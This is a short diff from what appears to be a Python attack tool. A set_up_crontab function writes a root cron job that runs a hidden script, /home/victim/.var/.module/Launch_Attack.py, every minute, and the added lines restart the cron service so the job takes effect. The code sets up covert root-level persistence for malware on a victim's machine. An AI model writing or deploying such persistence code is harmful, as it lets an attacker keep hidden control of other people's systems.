@@ -13,6 +13,8 @@ def set_up_crontab():
     crontab.write('\n*/1 * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py')
     crontab.close()
 
+    os.system('sudo /etc/init.d/cron restart')
+
     return
 
 
